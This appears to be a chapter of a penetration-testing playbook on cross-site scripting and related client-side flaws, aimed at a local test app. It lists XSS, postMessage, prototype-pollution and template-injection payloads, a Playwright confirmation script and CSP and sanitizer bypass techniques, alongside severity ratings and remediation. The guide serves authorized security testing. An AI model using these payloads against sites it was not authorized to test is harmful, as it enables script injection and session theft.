# 06 — XSS and Client-Side

## 1. Scope and preconditions

The app reflects or stores user input in HTML, attributes, JavaScript, or a client-side router. XSS needs a browser to confirm DOM execution; `curl` can only show reflection. If no browser is available, mark DOM XSS Suspected and say why.

```bash
TARGET="http://127.0.0.1:5001"
OUT=".redteam/evidence/xss"
mkdir -p "$OUT"
```

## 2. Required Test Identities and seeded data

Anonymous for public reflection; user A for stored fields (profile, comment, filename); admin for admin-panel stored XSS. Seed a marker string in each field so the reflection point is easy to find.

## 3. Enumeration

Send a unique marker and locate every reflection:

```bash
MARK="zqx$(date +%s)"
for path in "/" "/search?q=$MARK" "/profile?name=$MARK"; do
  curl -sS "$TARGET$path" | grep -n "$MARK" && echo "reflected: $path"
done
```

Check the context: HTML body, attribute, `<script>`, JSON, URL, CSS. The context determines the payload.

## 4. Test cases

| # | Test | Exact request / command | Signal |
|---|---|---|---|
| 1 | Reflected HTML | `curl -sS --get --data-urlencode "q=<script>alert(1)</script>" "$TARGET/search"` | Script tag unencoded |
| 2 | Attribute breakout | `q="><img src=x onerror=alert(1)>` | New attribute or tag |
| 3 | Stored XSS | POST the payload to a profile/comment, then fetch the page as another user | Payload persisted and rendered |
| 4 | DOM XSS | Open `$TARGET/#<img src=x onerror=alert(1)>` in a browser; check `innerHTML`, `eval`, `document.write` sinks | Execution in the DOM |
| 5 | CSP review | `curl -sS -D - "$TARGET/" -o /dev/null \| grep -i content-security-policy` | Missing CSP, `unsafe-inline`, wildcard, or JSONP allowlist |
| 6 | postMessage | Send `window.postMessage({type:"render",html:"<img src=x onerror=alert(1)>"},"*")` from a local page | Listener renders without origin check |
| 7 | Prototype pollution | `?__proto__[polluted]=yes` or `{"__proto__":{"polluted":"yes"}}` | Polluted property visible in the client |
| 8 | Open redirect | `curl -sS -i "$TARGET/redirect?next=http://127.0.0.1:9999/"` | `Location` points to the external host |
| 9 | Clickjacking | `curl -sS -D - "$TARGET/" -o /dev/null \| grep -i 'x-frame-options\|frame-ancestors'` | Neither header nor CSP directive |
| 10 | Token storage | Inspect `localStorage`, `sessionStorage`, and non-HttpOnly cookies in the browser | Session token readable by JS |
| 11 | Client-side template | `?name={{constructor.constructor('alert(1)')()}}` | Execution in a client template |
| 12 | Markdown / SVG | Upload or paste `<svg onload=alert(1)>` or a Markdown link with `javascript:` | Sanitizer bypass |

### Browser confirmation

Use Playwright or the project's browser tooling if present:

```bash
node - <<'JS'
const { chromium } = require('playwright');
(async () => {
  const b = await chromium.launch();
  const p = await b.newPage();
  let hit = false;
  p.on('dialog', async d => { hit = true; await d.dismiss(); });
  await p.goto(process.env.TARGET + '/#<img src=x onerror=alert(1)>');
  await p.waitForTimeout(1000);
  console.log('dialog:', hit);
  await b.close();
})();
JS
```

If Playwright is not installed, do not install it from an untrusted source mid-engagement. Use an existing browser tool or mark the finding Suspected with the reflection evidence.

## 5. Bypass variants

- Encoding: HTML entities, URL encoding, double encoding, Unicode escapes, `\u003c`.
- Tag and attribute variants: `<svg>`, `<math>`, `<details open ontoggle>`, `<iframe srcdoc>`.
- Event handlers: `onerror`, `onload`, `onfocus`, `ontoggle`, `onpointerover`.
- JavaScript contexts: break out of strings, use template literals, `</script>` injection.
- CSP bypass: JSONP endpoints, `unsafe-inline`, `unsafe-eval`, wildcard hosts, base-uri injection.
- Sanitizer bypass: mutation XSS, namespace confusion, comment tricks, malformed nesting.
- DOM sinks: `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, `setTimeout(string)`.

## 6. Evidence to capture

- The exact payload, the encoding used, and the reflection context.
- A screenshot or browser trace showing `alert(1)` or a DOM change.
- The sink and the data flow from source to sink.
- For stored XSS: the write request, the read request as another identity, and the stored value.
- CSP header and the bypass used.

## 7. False-positive traps

- A payload reflected inside a `<textarea>` or a JSON string may not execute. Check the context.
- A browser may block the payload due to CSP; that is a mitigation, not proof of safety if a bypass exists.
- `alert(1)` may be blocked by the browser's dialog settings. Use `console.log` or a DOM marker as a fallback.
- A stored payload may be sanitized on read, not write. Test both.
- Self-XSS in the attacker's own profile is not a Finding unless it can be delivered to another user.

## 8. Severity guidance

| Finding | Typical severity | CWE / WSTG |
|---|---|---|
| Stored XSS in admin flow | High | CWE-79, WSTG-INPV-02 |
| Reflected XSS | Medium | CWE-79, WSTG-INPV-01 |
| DOM XSS | Medium to High | CWE-79, WSTG-CLNT-01 |
| XSS to session theft | High to Critical | CWE-79, CWE-1004 |
| CSP missing with XSS | Medium (enabler) | CWE-1021, WSTG-CLNT-07 |
| postMessage without origin check | Medium to High | CWE-346, WSTG-CLNT-11 |
| Prototype pollution | Medium to High | CWE-1321 |
| Open redirect | Low to Medium | CWE-601, WSTG-CLNT-04 |
| Clickjacking on sensitive action | Medium | CWE-1021, WSTG-CLNT-09 |

## 9. Remediation patterns

- Encode output for the exact context (HTML, attribute, JavaScript, URL, CSS).
- Use a maintained auto-escaping template engine; do not concatenate HTML.
- Sanitize rich text with a strict allowlist on the server; do not rely on client-side sanitizers.
- Set a strict CSP with nonces or hashes; avoid `unsafe-inline` and wildcard sources.
- Set `HttpOnly` on session cookies.
- Validate `Origin` in `postMessage` handlers and never render untrusted HTML.
- Use `frame-ancestors` for clickjacking.
- Validate redirect targets against an allowlist.

## 10. Retest procedure

Replay the exact payload in the same context. Expect it encoded or removed, and no dialog or DOM marker. Replay two bypass variants (attribute and encoding). For stored XSS, write again as A and read as B; expect no execution. Recheck the CSP header.

## Resources

- OWASP WSTG: WSTG-INPV-01, WSTG-INPV-02, WSTG-CLNT, WSTG-CLNT-11.
- OWASP Cheat Sheet: XSS Prevention, Content Security Policy, DOM XSS.
- CWE-79, CWE-346, CWE-601, CWE-1021, CWE-1321.
- PortSwigger Academy: XSS, DOM XSS, CSP bypass, prototype pollution labs.
